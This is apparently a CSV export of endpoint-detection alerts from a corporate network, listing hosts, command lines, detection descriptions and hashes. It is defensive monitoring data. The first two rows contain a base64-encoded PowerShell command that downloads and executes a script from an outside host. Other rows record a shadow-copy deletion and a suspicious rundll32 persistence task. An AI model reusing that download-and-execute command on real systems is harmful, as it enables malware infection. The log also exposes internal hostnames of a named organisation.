Id,Count,AgentID,FQDN,CommandLine,Description,FilePath,MD5Hash,event_quarantine_files_sha256_hash_data,IncidentInfo,GxP/NON-GxP/Server
2,862,b1db240401224c0ea79c9613a5c4ddc1,DR-PC,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=,A domain matched a Custom Intelligence Indicator (Custom IOC) with high severity.,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,92f44e405db16ac55d97e3bfe3b132fa,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:b1db240401224c0ea79c9613a5c4ddc1:533414083948.json,GxP
4,861,f40b1426fa704df4992e2d7cc2923b99,IPC20191101,C:\windows\System32\WindowsPowerShell\v1.0\powershell.EXE -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=,"A script meets the cloud-based behavioral machine learning model threshold for suspicious activity. Detection is based on code similarities to known malicious PowerShell scripts., PowerShell unexpectedly wrote and ran an executable. PowerShell is often abused as a dropper for malicious payloads. Investigate the process tree.",\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"097ce5761c89434367598b34fe32893b, N/A",,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:f40b1426fa704df4992e2d7cc2923b99:276268417301.json,
43,237,163b18ca73b2499f8c7d8697b92335b7,INFT7DBPRE067,D:\SCADA\ReportTool.exe UHS45JFGD45S8XF5SF5U Guest Guest,This file meets the File Analysis ML algorithm's low-confidence threshold for malware.,\Device\HarddiskVolume4\SCADA\ReportTool.exe,c0418cef5de70e36a2ac9e0ac41b790a,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:163b18ca73b2499f8c7d8697b92335b7:249275843390.json,
4010,61,3558a25e04a748c0b588c28e7ab276a9,DT-SHV-030A.CORP.DRREDDYS.COM,"""C:\program files (x86)\lenovo\rescue and recovery\shadow.exe"" destroy identifier=br_funcs","A process attempted to hide a Volume Shadow Snapshot., A process attempted to delete a Volume Shadow Snapshot.",\Device\HarddiskVolume1\Program Files (x86)\Lenovo\Rescue and Recovery\shadow.exe,9fc1f3fb761e7228c580bc8e24f42bb2,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:3558a25e04a748c0b588c28e7ab276a9:481136486802.json,
3005,50,44704cdd509840a886ad209aebf09a0d,INBIODRELADHL35.CORP.DRREDDYS.COM,C:\Windows\CCM\CcmExec.exe,A process loaded a module that shares characteristics with a known malicious file. Review the modules loaded by the process.,\Device\HarddiskVolume1\Windows\CCM\CcmExec.exe,710a553a6a00b2da3252931e0856da3c,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:44704cdd509840a886ad209aebf09a0d:665815602371.json,
206,40,36ce38fc36204b1cbc8949805d10d60f,INCRPVHELNRD87.CORP.DRREDDYS.COM,"XCOPY  /y ""\\NEWADC03\netlogon\WORKMATE VM\*.*"" ""C:\Workmate VM\""",A file written to the file-system meets the File Analysis ML algorithm's low-confidence threshold for malware.,\Device\HarddiskVolume2\Windows\System32\xcopy.exe,,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:36ce38fc36204b1cbc8949805d10d60f:214748642570.json,
70,33,163b18ca73b2499f8c7d8697b92335b7,INFT7DBPRE067,D:\SCADA\ReportTool.exe DHS78DFGD45S8XL5SF5D Guest Guest,This file meets the File Analysis ML algorithm's low-confidence threshold for malware.,\Device\HarddiskVolume4\SCADA\ReportTool.exe,c0418cef5de70e36a2ac9e0ac41b790a,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:163b18ca73b2499f8c7d8697b92335b7:249291231436.json,
89,33,a5eb6d9e251e461f873b438070d02afb,GCPINMSWEBDEV.CORP.DRREDDYS.COM,"""C:\Program Files (x86)\MicroStrategy\Workstation\MicroStrategyServices-win.exe"" ",Your IOC management action for this SHA256 hash is set to detect and/or quarantine,\Device\HarddiskVolume4\Program Files (x86)\MicroStrategy\Workstation\MicroStrategyServices-win.exe,,b393f05e8ff919ef071181050e1873c9a776e1a0ae8329aefff7007d0cadf592,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:a5eb6d9e251e461f873b438070d02afb:1889786319903.json,
8,31,410990243068490fb4b50781d2eff28e,INPU1PRDPR264,C:\windows\system32\wuauclt.exe,Your IOC management action for this SHA256 hash is set to detect and/or quarantine,\Device\HarddiskVolume2\Windows\System32\wuauclt.exe,", 8c80dd97c37525927c1e549cb59bcbf3","f06d02359666b763e189402b7fbf9dfa83ba6f4da2e7d037b3f9aebefd2d5a45, c51bce247bee4a6f4cd2d7d45483b5b1d9b53f8cc0e04fb4f4221283e356959d, b556b5c077e38dcb65d21a707c19618d02e0a65ff3f9887323728ec078660cc3, 0439628816cabe113315751e7113a9e9f720d7e499ffdd78acbac1ed8ba35887, 9b8ec5d0c10ccdd3933b7712ba40065d1b0dd3ffa7968fb28ad426cd5eee5001, db0831e19a4e3a736ea7498dadc2d6702342f75fd8f7fbae1894ee2e9738c2b4, d3db1e56360b25e7f36abb822e03c18d23a19a9b5f198e16c16e06785fc8c5fa, 50f329e034db96ba254328cd1e0f588af6126c341ed92ddf4aeb96bc76835937, 3fcffe9eae90ec365efb361674613ac95de50b2ccfd634c24491923f85c309a5, 19690e5b862042d9011dbdd92504f5012c08d51efca36828a5e9bdfe27d88842, fe4640fefa4bef02041a771a206f9184adb38de051f0d8726c4579736fe13bb6, 8a5cce25f1bf60e716709c724b96630b95e55cc0e488d74d60ea50ffba7d6946, 7ddbade1f4fcb48f254e7defa1ab5ec568e8ff0403693860b76870e11816aee6, 3596e8fa5e19e860a2029fa4ab7a4f95fadf073feb88e4f82b19a093e1e2737c, b1d48e8185d9d366dce8c723ba765d6c593b7873cb43d77335084b58bbc7cb4d, 15292172a83f2e7f07114693ab92753ed32311dfba7d54fe36cc7229136874d9, 609ed51631da2defa34d58f60dc2a0f38e1574d8cf07647b844fc8b95de4bd8c, c977ac10aa3d2250a1af39630f532184a5185f505bcd5f03ea7083a3a701a969, df9200ba0d967487b9eb9627078d7faa88072c493b6d9e2b68211c14b06e9f4e, 36b0fa6c0da7434707e7e330f40316458c0c1edc39b80e2fe58745cd77955eb3, d3c6985d965cad5bff6075677ed8c2cafee4c3a048fb5af81b442665c76dff7b, 5f30aa2fe338191b972705412b8043b0a134cdb287d754771fc225f2309e82ee, 47e16f7db53d9adf24d193ff4d523b1bc7ae59ff8520cfa012365bdb947c96f9, 1743e1bd4176ffb62a1a0503a0d76033752f8bd34f6f09db85c2979c04bbdd29, 93f0a1fe486ad222b742e451f25f4c9219b1e0f5b4273a15ce08dd714827745a, be8eb97d8171b8c91c6bc420346f7a6d2d2f76809a667ade03c990feffadaad5, 17d6dde8a6715b9311734cb557b76160a22e340785b3950eae23aae67b0af6a8, 1c8100aca288483d5c29dcf33df887e72513f9b1cb6d0c96045401981351307c, 55039ab48c0916a38f1ceee08ba9f9cf5f292064cf3ee6631f22becde5e74b2d, cde45f7ff05f52b7215e4b0ea1f2f42ad9b42031e16a3be9772aa09e014bacdb, 15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13, aceb27720115a63b9d47e737fd878a61c52435ea4ec86ba8e58ee744bc85c4f3, f8ee4c00a3a53206d8d37abe5ed9f4bfc210a188cd5b819d3e1f77b34504061e, 52e88433f2106cc9a3a961cd8c3d0a8939d8de28f2ef3ee8ea648534a8b036a4, 70dbb0b5562cd034c6b70a4a86a346b0f0039acf1b09f5814c42895963e12ea0, ca63dbb99d9da431bf23aca80dc787df67bb01104fb9358a7813ed2fce479362, a418edc5f1fb14fbf9398051225f649810fa75514ca473610be44264bf3c663c, 6775d627d99733f3f02494db7e13935b505132f43c56e7f8850c54e6627691de, 85b936960fbe5100c170b777e1647ce9f0f01e3ab9742dfc23f37cb0825b30b5, 96edea8d08ab10eee86776cfb9e32b4701096d21c39dbffeb49bd638f09d726a, b2a3172a1d676f00a62df376d8da805714553bb3221a8426f9823a8a5887daaa, 06c031f0d905cdeb0d9c172c27ae0c2d25bbf0d08db27a4aa98ec540a15306e7, a4c460b27d03daf7828f6b6db87e0ff3ee851fdb1b8654b0a778b4c34953a3dc, f0df80978b3a563077def7ba919e2f49e5883d24176e6b3371a8eef1efe2b06a, cf25bdc6711a72713d80a4a860df724a79042be210930dcbfc522da72b39bb12, 36107f74be98f15a45ff716e37dad70f1ff9515bc72a0a1ec583b803c220aa92, aa8adf96fc5a7e249a6a487faaf0ed3e00c40259fdae11d4caf47a24a9d3aaed, 0259d41720f7084716a3b2bbe34ac6d3021224420f81a4e839b0b3401e5ef29f, 3f06740b150e1fa64c501210e83e75adecd074e99fe90160912bbd2368a33be5, 2af73c8603e1d51661b0fffc09be306797558204bcbd4f95dd2dfe8363901606, ed2febf310ae90739002b9ddb07a29d0b2c8e92462ae4a0a6dcc19cc537ddef3, b7d8fcc3fb533e5e0069e00bc5a68551479e54a990bb1b658e1bd092c0507d68",/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:410990243068490fb4b50781d2eff28e:347911122031.json,
403,31,c303498a7574491a906a75a77b01825f,INSTQC278.CORP.DRREDDYS.COM,"rundll32.exe mfysvfv.t,nrdhlo","A process has scheduled an unusual task. Some malware schedules tasks to maintain persistence. If this task unexpected, review it.",\Device\HarddiskVolume2\Windows\System32\rundll32.exe,dd81d91ff3b0763c392422865c9ac12e,,/home/attackfence/CSDetectionsInfo/CSDetectionsDetails/ldt:c303498a7574491a906a75a77b01825f:863376308218.json,
